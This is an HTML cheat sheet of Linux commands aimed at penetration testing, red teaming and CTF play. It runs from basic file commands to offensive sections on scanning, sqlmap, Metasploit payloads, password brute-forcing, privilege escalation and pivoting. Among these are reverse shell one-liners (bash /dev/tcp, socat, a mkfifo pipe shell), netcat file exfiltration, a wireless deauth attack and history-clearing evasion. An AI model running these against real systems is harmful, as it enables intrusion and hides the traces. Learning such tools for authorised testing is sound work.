<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linux Command Cheat Sheet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 40px 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .header {
            background: linear-gradient(135deg, #4a69bd 0%, #6a89cc 100%);
            color: white;
            padding: 40px;
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .tux-icon {
            width: 80px;
            height: 80px;
            background: #ffd700;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 50px;
            flex-shrink: 0;
        }
        
        .header-text h1 {
            font-size: 42px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        .header-text p {
            font-size: 18px;
            opacity: 0.95;
        }
        
        .content {
            padding: 40px;
            background: #f8f9fa;
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .section {
            background: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }
        
        .section-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            padding-bottom: 12px;
            border-bottom: 2px solid #e9ecef;
        }
        
        .section-icon {
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }
        
        .files { background: #ffd93d; }
        .operations { background: #6bcf7f; }
        .permissions { background: #ff8c42; }
        .disk { background: #4a90e2; }
        .process { background: #a78bfa; }
        .network { background: #06b6d4; }
        .shortcuts { background: #ef4444; }
        .interview { background: #fbbf24; }
        .archive { background: #8b5cf6; }
        .ssh { background: #10b981; }
        .recon { background: #ec4899; }
        .scanning { background: #f59e0b; }
        .exploitation { background: #dc2626; }
        .privesc { background: #7c3aed; }
        .webexp { background: #06b6d4; }
        .password { background: #84cc16; }
        .forensics { background: #6366f1; }
        .stealth { background: #64748b; }
        
        .section-header h3 {
            font-size: 18px;
            font-weight: 700;
            color: #1f2937;
        }
        
        .command-list {
            list-style: none;
        }
        
        .command-item {
            display: flex;
            padding: 10px 0;
            border-bottom: 1px solid #f3f4f6;
            align-items: flex-start;
        }
        
        .command-item:last-child {
            border-bottom: none;
        }
        
        .cmd {
            font-family: 'Monaco', 'Menlo', 'Courier New', monospace;
            font-size: 14px;
            font-weight: 600;
            color: #1e40af;
            min-width: 280px;
            flex-shrink: 0;
        }
        
        .desc {
            font-size: 14px;
            color: #4b5563;
            line-height: 1.5;
        }
        
        .footer {
            background: #1f2937;
            color: white;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
        }
        
        @media (max-width: 768px) {
            .grid {
                grid-template-columns: 1fr;
            }
            
            .header-text h1 {
                font-size: 32px;
            }
            
            .content {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="tux-icon">🐧</div>
            <div class="header-text">
                <h1>Linux Commands</h1>
                <p>Essential cheat sheet for Red Team, Penetration Testing & CTF</p>
            </div>
        </div>
        
        <div class="content">
            <div class="grid">
                <!-- File & Directory Commands -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon files">📁</div>
                        <h3>File & Directory Commands</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">pwd</span>
                            <span class="desc">Show current directory</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ls</span>
                            <span class="desc">List files</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ls -l</span>
                            <span class="desc">Detailed list</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ls -a</span>
                            <span class="desc">Show hidden files</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">cd foldername</span>
                            <span class="desc">Change directory</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">cd ..</span>
                            <span class="desc">Go back one folder</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">mkdir test</span>
                            <span class="desc">Create directory</span>
                        </li>
                    </ul>
                </div>
                
                <!-- File Operations -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon operations">📄</div>
                        <h3>File Operations</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">touch file.txt</span>
                            <span class="desc">Create file</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">cat file.txt</span>
                            <span class="desc">Show file content</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">tail -f log.txt</span>
                            <span class="desc">Live logs</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">mv old.txt new.txt</span>
                            <span class="desc">Rename/move file</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">cp file.txt copy.txt</span>
                            <span class="desc">Copy file</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">rm file.txt</span>
                            <span class="desc">Delete file</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Permissions -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon permissions">🔐</div>
                        <h3>Permissions</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">chmod 755 script.sh</span>
                            <span class="desc">Set execute permission</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">chmod +x script.sh</span>
                            <span class="desc">Make executable</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">chown user file</span>
                            <span class="desc">Change owner</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ls -l</span>
                            <span class="desc">See permissions</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Disk & Memory -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon disk">💾</div>
                        <h3>Disk & Memory</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">df -h</span>
                            <span class="desc">Disk space</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">du -sh folder</span>
                            <span class="desc">Folder size</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">free -m</span>
                            <span class="desc">Memory usage</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Process Commands -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon process">⚙️</div>
                        <h3>Process Commands</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">ps -ef</span>
                            <span class="desc">Running processes</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">top</span>
                            <span class="desc">Live processes</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">kill PID</span>
                            <span class="desc">Kill process</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">pkill name</span>
                            <span class="desc">Kill by name</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Network -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon network">🌐</div>
                        <h3>Network</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">ip a</span>
                            <span class="desc">Show IP address</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ping google.com</span>
                            <span class="desc">Test connectivity</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">curl url</span>
                            <span class="desc">Fetch web content</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">netstat -tuln</span>
                            <span class="desc">Show open ports</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Important Shortcuts -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon shortcuts">⌨️</div>
                        <h3>Important Shortcuts</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">Ctrl + C</span>
                            <span class="desc">Stop/terminate</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">Ctrl + Z</span>
                            <span class="desc">Pause process</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">Ctrl + D</span>
                            <span class="desc">Exit/logout</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">clear</span>
                            <span class="desc">Clear screen</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Must Know -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon interview">⭐</div>
                        <h3>Must Know</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">sudo</span>
                            <span class="desc">Run as admin</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">vi file.txt</span>
                            <span class="desc">Edit file</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">echo "hello"</span>
                            <span class="desc">Print text</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">grep pattern file</span>
                            <span class="desc">Search in file</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">man command</span>
                            <span class="desc">Show manual</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Archive/Compression -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon archive">🗜️</div>
                        <h3>Archive & Compression</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">tar -czf file.tar.gz dir</span>
                            <span class="desc">Create archive</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">tar -xzf file.tar.gz</span>
                            <span class="desc">Extract archive</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">zip test.zip file.txt</span>
                            <span class="desc">Create zip</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">unzip test.zip</span>
                            <span class="desc">Extract zip</span>
                        </li>
                    </ul>
                </div>
                
                <!-- SSH & Remote -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon ssh">🔑</div>
                        <h3>SSH & Remote</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">ssh user@server</span>
                            <span class="desc">Connect to server</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">scp file user@server:</span>
                            <span class="desc">Copy to server</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ssh-keygen</span>
                            <span class="desc">Generate SSH key</span>
                        </li>
                    </ul>
                </div>
                
                <!-- System Info -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon interview">💻</div>
                        <h3>System Information</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">uname -a</span>
                            <span class="desc">System info</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">whoami</span>
                            <span class="desc">Current user</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">hostname</span>
                            <span class="desc">Show hostname</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">uptime</span>
                            <span class="desc">System uptime</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Text Processing -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon operations">📝</div>
                        <h3>Text Processing</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">grep "text" file</span>
                            <span class="desc">Search text</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">sed 's/old/new/' file</span>
                            <span class="desc">Replace text</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">awk '{print $1}' file</span>
                            <span class="desc">Process columns</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">sort file.txt</span>
                            <span class="desc">Sort lines</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Reconnaissance -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon recon">🔍</div>
                        <h3>Reconnaissance</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">nmap -sV target</span>
                            <span class="desc">Service scan</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nmap -sC target</span>
                            <span class="desc">Default scripts</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nmap -p- target</span>
                            <span class="desc">All ports scan</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">whois domain.com</span>
                            <span class="desc">Domain info</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">dig domain.com</span>
                            <span class="desc">DNS lookup</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">host domain.com</span>
                            <span class="desc">Quick DNS</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Advanced Scanning -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon scanning">🎯</div>
                        <h3>Advanced Scanning</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">nmap -sS target</span>
                            <span class="desc">SYN stealth scan</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nmap -sU target</span>
                            <span class="desc">UDP scan</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nmap -A target</span>
                            <span class="desc">Aggressive scan</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">masscan -p1-65535 target</span>
                            <span class="desc">Fast port scan</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nikto -h target</span>
                            <span class="desc">Web vuln scan</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">enum4linux target</span>
                            <span class="desc">SMB enumeration</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Web Exploitation -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon webexp">🌐</div>
                        <h3>Web Exploitation</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">gobuster dir -u URL -w wordlist</span>
                            <span class="desc">Directory brute force</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ffuf -u URL/FUZZ -w wordlist</span>
                            <span class="desc">Web fuzzing</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">wfuzz -w wordlist URL</span>
                            <span class="desc">Parameter fuzzing</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">sqlmap -u URL --dbs</span>
                            <span class="desc">SQL injection</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">burpsuite</span>
                            <span class="desc">Web proxy/scanner</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">dirb http://target</span>
                            <span class="desc">Web content scan</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Exploitation Tools -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon exploitation">💥</div>
                        <h3>Exploitation</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">msfconsole</span>
                            <span class="desc">Metasploit framework</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">searchsploit apache</span>
                            <span class="desc">Search exploits</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">msfvenom -p payload</span>
                            <span class="desc">Generate payload</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nc -lvnp 4444</span>
                            <span class="desc">Netcat listener</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nc target 80</span>
                            <span class="desc">Connect to port</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">python3 exploit.py</span>
                            <span class="desc">Run exploit</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Password Attacks -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon password">🔓</div>
                        <h3>Password Attacks</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">hydra -l user -P pass.txt ssh://target</span>
                            <span class="desc">SSH brute force</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">john --wordlist=rockyou.txt hash.txt</span>
                            <span class="desc">John password crack</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">hashcat -m 0 hash.txt wordlist</span>
                            <span class="desc">Hashcat crack</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">unshadow passwd shadow</span>
                            <span class="desc">Combine passwd files</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">crunch 8 8 -t @@@@@%%% -o list.txt</span>
                            <span class="desc">Generate wordlist</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">medusa -h target -u user -P pass.txt</span>
                            <span class="desc">Multi-protocol attack</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Privilege Escalation -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon privesc">⬆️</div>
                        <h3>Privilege Escalation</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">sudo -l</span>
                            <span class="desc">Check sudo rights</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">find / -perm -4000 2>/dev/null</span>
                            <span class="desc">Find SUID binaries</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">getcap -r / 2>/dev/null</span>
                            <span class="desc">List capabilities</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">cat /etc/crontab</span>
                            <span class="desc">Check cron jobs</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">linpeas.sh</span>
                            <span class="desc">Linux enum script</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">pspy64</span>
                            <span class="desc">Monitor processes</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Reverse Shells -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon exploitation">🐚</div>
                        <h3>Reverse Shells</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">bash -i >& /dev/tcp/IP/PORT 0>&1</span>
                            <span class="desc">Bash reverse shell</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">python -c 'import pty;pty.spawn("/bin/bash")'</span>
                            <span class="desc">Upgrade shell</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">script /dev/null -c bash</span>
                            <span class="desc">TTY shell</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">socat TCP:IP:PORT EXEC:/bin/bash</span>
                            <span class="desc">Socat shell</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh</span>
                            <span class="desc">Named pipe shell</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Forensics & Data -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon forensics">🔬</div>
                        <h3>Forensics & Data</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">strings file</span>
                            <span class="desc">Extract strings</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">exiftool image.jpg</span>
                            <span class="desc">View metadata</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">binwalk file</span>
                            <span class="desc">Analyze binary</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">steghide extract -sf image.jpg</span>
                            <span class="desc">Extract steganography</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">foremost -i file</span>
                            <span class="desc">File carving</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">volatility -f dump imageinfo</span>
                            <span class="desc">Memory analysis</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Stealth & Evasion -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon stealth">👻</div>
                        <h3>Stealth & Evasion</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">proxychains nmap target</span>
                            <span class="desc">Route through proxy</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nmap -D RND:10 target</span>
                            <span class="desc">Decoy scan</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">macchanger -r eth0</span>
                            <span class="desc">Change MAC address</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">history -c</span>
                            <span class="desc">Clear bash history</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">unset HISTFILE</span>
                            <span class="desc">Disable history</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">shred -vfz -n 10 file</span>
                            <span class="desc">Secure delete</span>
                        </li>
                    </ul>
                </div>
                
                <!-- SMB & Windows -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon network">💼</div>
                        <h3>SMB & Windows</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">smbclient //target/share</span>
                            <span class="desc">Connect to SMB</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">smbmap -H target</span>
                            <span class="desc">SMB share enum</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">rpcclient -U "" target</span>
                            <span class="desc">RPC enumeration</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">crackmapexec smb target</span>
                            <span class="desc">SMB assessment</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">impacket-psexec user@target</span>
                            <span class="desc">Remote execution</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Encoding & Decoding -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon operations">🔤</div>
                        <h3>Encoding & Crypto</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">base64 -d file</span>
                            <span class="desc">Base64 decode</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">echo text | base64</span>
                            <span class="desc">Base64 encode</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">xxd file</span>
                            <span class="desc">Hex dump</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">md5sum file</span>
                            <span class="desc">MD5 hash</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">sha256sum file</span>
                            <span class="desc">SHA256 hash</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">openssl enc -aes-256-cbc -d</span>
                            <span class="desc">Decrypt AES</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Wireless -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon network">📡</div>
                        <h3>Wireless</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">airmon-ng start wlan0</span>
                            <span class="desc">Monitor mode</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">airodump-ng wlan0mon</span>
                            <span class="desc">Capture packets</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">aireplay-ng --deauth 0 -a MAC wlan0mon</span>
                            <span class="desc">Deauth attack</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">aircrack-ng -w wordlist capture.cap</span>
                            <span class="desc">Crack WPA</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">wash -i wlan0mon</span>
                            <span class="desc">WPS networks</span>
                        </li>
                    </ul>
                </div>
                
                <!-- File Transfer -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon files">📤</div>
                        <h3>File Transfer</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">python3 -m http.server 8000</span>
                            <span class="desc">Simple HTTP server</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">wget http://IP/file</span>
                            <span class="desc">Download file</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">curl -O http://IP/file</span>
                            <span class="desc">Fetch file</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">scp file user@IP:/path</span>
                            <span class="desc">Secure copy</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">nc -w 3 IP 1234 < file</span>
                            <span class="desc">Netcat transfer</span>
                        </li>
                    </ul>
                </div>
                
                <!-- Tunneling & Pivoting -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon ssh">🚇</div>
                        <h3>Tunneling & Pivoting</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">ssh -L 8080:target:80 user@pivot</span>
                            <span class="desc">Local port forward</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ssh -R 8080:localhost:80 user@pivot</span>
                            <span class="desc">Remote port forward</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">ssh -D 9050 user@pivot</span>
                            <span class="desc">SOCKS proxy</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">chisel server -p 8000 --reverse</span>
                            <span class="desc">Chisel server</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">socat TCP-LISTEN:8080,fork TCP:target:80</span>
                            <span class="desc">Port forwarding</span>
                        </li>
                    </ul>
                </div>
                
                <!-- OSINT -->
                <div class="section">
                    <div class="section-header">
                        <div class="section-icon recon">🕵️</div>
                        <h3>OSINT</h3>
                    </div>
                    <ul class="command-list">
                        <li class="command-item">
                            <span class="cmd">theHarvester -d domain -b all</span>
                            <span class="desc">Email/subdomain enum</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">sublist3r -d domain.com</span>
                            <span class="desc">Subdomain enum</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">amass enum -d domain.com</span>
                            <span class="desc">Deep subdomain enum</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">recon-ng</span>
                            <span class="desc">OSINT framework</span>
                        </li>
                        <li class="command-item">
                            <span class="cmd">sherlock username</span>
                            <span class="desc">Social media hunt</span>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>💡 Essential Linux commands for Penetration Testing / Red Team / CTF / DevOps / Cybersecurity</p>
        </div>
    </div>
</body>
</html>
